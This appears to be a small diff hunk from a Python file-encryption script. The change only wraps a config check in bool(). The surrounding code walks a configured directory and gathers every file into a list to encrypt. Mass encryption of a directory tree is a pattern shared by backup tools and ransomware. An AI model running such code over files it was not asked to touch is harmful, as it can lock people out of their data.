@@ -25,7 +25,7 @@ def crypt_file(_file):
 
 
 def main():
-    if config['walkdir']:
+    if bool(config['walkdir']):
         files_to_encrypt = []
         for _dir, _, files in list(os.walk(config['path'])):
             files_to_encrypt += [_dir + '/' + _file for _file in files]
